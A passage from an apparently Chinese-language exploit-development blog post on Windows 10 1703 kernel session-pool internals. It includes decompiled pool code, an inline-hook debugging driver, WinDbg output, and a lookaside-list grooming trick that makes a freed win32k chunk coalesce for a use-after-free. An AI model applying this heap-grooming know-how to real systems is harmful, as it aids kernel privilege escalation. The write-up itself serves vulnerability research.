&lt;p&gt;在 win10 1703 (x64) 中，设置该 flag 的代码位于 InitializePagedPool 中&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;n&quot;&gt;NumberOfPhysicalPages&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MmGetNumberOfPhysicalPages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NumberOfPhysicalPages&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1FC00&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MmSpecialPoolTag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LODWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NumberOfPhysicalPages&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MmIsVerifierEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VerifierFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NumberOfPhysicalPages&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i64&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;_InterlockedOr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExpPoolFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;正常情况下，只要内存够大，是会开启的，并且没有上面说的两分钟之后关闭的代码逻辑。&lt;/p&gt;

&lt;p&gt;再研究一下这个机制的作用吧（来源于 xp 代码）：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;如果开启该机制，那么在分配 paged pool 时就不使用 lookaside list。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在内核分配 paged pool 时，如果分配的 pool 为 hot allocation，那么内核会从 pool index 为 1 的 paged pool 中分配内存，而如果分配的 pool 为 cold allocation，那么内核会从最后一个 paged pool 分配内存。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在释放时，如果开启了该机制，那么是不会将 small block 释放到 lookaside list 中的。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这么看来，这个机制似乎与合并 chunk 关系并不太大，主要用于决定分配时是否使用 lookaside list 以及决定分配的 pool 的位置。并且我们继续回顾 ExFreePoolWithTag 的代码，分析当 ExpPoolFlags 0x100 置 1 的情况，会发现走的竟然是 defer free 的逻辑，继续在 ExAllocatePoolWithTag 找相关逻辑，也没有找到上面所说的关于是否使用 lookaside list 的部分。根据上面所有的发现，我认为这个 hot/cold page separation 机制可能在 win7 之后已经废弃了，而 0x100 这个位已经被用于 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX_DELAY_POOL_FREES&lt;/code&gt; 这个 mask，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;EX_DELAY_POOL_FREES&lt;/code&gt; 原来的 0x200 可能也被用作他用。&lt;/p&gt;

&lt;p&gt;好了，现在我们知道，问题出在 defer free 上，我们释放了 3000 个 accelerator table，按理说怎么也应该释放并合并 sbtrack 之后的那一块了，还需要继续调试。&lt;/p&gt;

&lt;p&gt;既然在 defer free 的时候没有合并，那么首先断到 sbtrack 后面的那个 chunk 被释放的时刻，然后找到该 chunk 的 pool descriptor，在 ExDeferredFreePool 下条件断点，判断 descriptor 是否相同就可以 trace defer free 的整个流程了。&lt;/p&gt;

&lt;p&gt;想法是非常完美的，但是实践的时候出了大问题。在 ExFreePoolWithTag 下断的时候发现无论如何也断不到 sbtrack 后面的 chunk 被释放的时候。等到所有的 accelerator table 都释放完再断下来，发现那个 chunk 已经被释放了。研究了整个下午，但还是不知道为什么断不下来，最终发现是 windows 内核调试机制可能有条件竞争的问题，这个问题在给虚拟机设置两个核心使用软件断点的情况下最为明显，3000 次释放，最终只能断下来 100 多次；当双核使用硬件条件断点的时候，会有条件失效、条件断点忽略条件直接断下来的情况，单核使用硬件断点也会有这种情况，但是次数少了很多。另外使用条件断点这么筛速度很慢，因此用 windbg 条件断点去定位目标 chunk 被释放的时刻是不太现实的。&lt;/p&gt;

&lt;p&gt;把这个问题跟群里兄弟们讲了一下，鸭鸭跟我说应该直接搞 inline hook，我觉得非常有道理，所以准备用 hook 解决。&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;ntddk.h&amp;gt;
#include &quot;HookLib.h&quot;
#pragma comment(lib,&quot;HookLib.lib&quot;)
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;decltype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExFreePoolWithTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OriginExFreePoolWithTag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;EXTERN_C&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ExDeferredFreePool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bMultiThreaded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;EXTERN_C&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;MiSessionPoolVector&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;EXTERN_C&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target_pool&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;EXTERN_C&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target_eprocess&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;EXTERN_C&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;decltype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExDeferredFreePool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ExDeferredFreePoolAddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;decltype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExDeferredFreePool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xfffff8012d902010&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;EXTERN_C&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;decltype&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExDeferredFreePool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OriginExDeferredFreePool&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;ExDeferredFreePool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bMultiThreaded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IoGetCurrentProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target_eprocess&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MiSessionPoolVector&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;__debugbreak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OriginExDeferredFreePool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bMultiThreaded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;typename&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Fn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;Fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hookFunc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Fn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Fn&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static_cast&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Fn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;VOID&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;HandlerExFreePoolWithTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;_Pre_notnull_&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__drv_freesMem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Mem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;_In_&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Tag&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target_pool&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;__debugbreak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;target_eprocess&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IoGetCurrentProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OriginExDeferredFreePool&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;nullptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;OriginExDeferredFreePool&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hookFunc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExDeferredFreePoolAddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ExDeferredFreePool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OriginExFreePoolWithTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Tag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;VOID&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;OnDriverUnload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IN&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PDRIVER_OBJECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pDriverObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;UNREFERENCED_PARAMETER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pDriverObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;unhook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OriginExFreePoolWithTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;unhook&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;OriginExDeferredFreePool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;DbgPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Driver unload routine triggered!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;EXTERN_C&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NTSTATUS&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DriverEntry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;PDRIVER_OBJECT&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;DriverObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;PUNICODE_STRING&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RegistryPath&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;OriginExFreePoolWithTag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hookFunc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ExFreePoolWithTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HandlerExFreePoolWithTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;DriverObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DriverUnload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;OnDriverUnload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;STATUS_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;大致逻辑就是先设置 ExFreePoolWithTag 的 hook，如果释放的地址是我们目标的内存，那么断下来。然后设置 ExDeferredFreePool 的 hook，捕获当前进程的下一次对 session pool 的 defer free 操作。&lt;/p&gt;

&lt;p&gt;用 inline hook 的方式成功 trace 了整个 defer free 的流程，然后开始一通分析，发现 defer free 合并 chunk 的逻辑是目标块前后 chunk 的 pool type 为 0 才合并，但是此时 sbtrack 的 pool type 为 0x2d，因此未合并。&lt;/p&gt;

&lt;p&gt;那么 sbtrack 被释放的时候为什么 type 没有设为 0？按理说 defer free 后 sbtrack 的 pooltype 会被设为 0，继续定位并追踪了一下 sbtrack 的释放流程，发现 sbtrack 并没有走 defer free 的流程，而是被扔进 lookaside list 里了，所以 type 不为 0。&lt;/p&gt;

&lt;p&gt;当 block size 小于等于 ExpSessionPoolSmallLists（w1703 中是 0x15）的时候就会考虑放进 lookaside list 中，这里我们的 sbtrack block size 大小为 8.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kd&amp;gt; dd nt!ExpSessionPoolSmallLists L1
fffff801`2da65194  00000015
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_SESSION_POOL_MASK&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_BASE_POOL_TYPE_MASK2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;block_size2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ExpSessionPoolSmallLists&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v39&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ExpSessionPoolLookaside&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;block_size2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_46&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nl&quot;&gt;LABEL_62:&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;pool_desc3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pool_desc2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_63&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;知道了问题的原因，那么就好解决问题了。既然 sbtrack 是被扔进了 lookaside list 中导致 chunk 没法合并，那么我们可以事先释放一下与 sbtrack 相同大小的 accelerator table，提前填满 lookaside list，这样 sbtrack 就会被正常释放掉了。&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kd&amp;gt; g
SBTrack: ffffde90c50d2820
Next Chunk: ffffde90c50d28a0
Pool page ffffde90c50d2820 region is Paged session pool
 ffffde90c50d2000 size:  810 previous size:    0  (Allocated)  Usac Process: ffffb28fd6566080
*ffffde90c50d2810 size:   80 previous size:  810  (Allocated) *Usst Process: ffffb28fd6566080
		Owning component : Unknown (update pooltag.txt)
 ffffde90c50d2890 size:  770 previous size:   80  (Allocated)  Usac Process: ffffb28fd6566080
win32kfull!xxxSBTrackInit+0x72:
ffffdec2`f9811dea 488bd8          mov     rbx,rax
kd&amp;gt; g
Break instruction exception - code 80000003 (first chance)
myexp!fnDWORDHook+0xd8:
0033:00007ff6`df2f4408 cc              int     3
kd&amp;gt; !pool ffffde90c50d2820
Pool page ffffde90c50d2820 region is Paged session pool
 ffffde90c50d2000 size:  810 previous size:    0  (Allocated)  Usac Process: ffffb28fd6566080
*ffffde90c50d2810 size:  7f0 previous size:  810  (Free)      *Usst
		Owning component : Unknown (update pooltag.txt)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;至此，这个困扰我两周的问题终于解决了。&lt;/p&gt;

&lt;h1 id=&quot;ntgdisetlinkedufis&quot;&gt;NtGdiSetLinkedUFIs&lt;/h1&gt;

&lt;p&gt;回到我们最开始的思路，尝试用悬空的 palette 对象句柄操作内存，最终会发现还是不行，会得到一个 page fault。&lt;/p&gt;

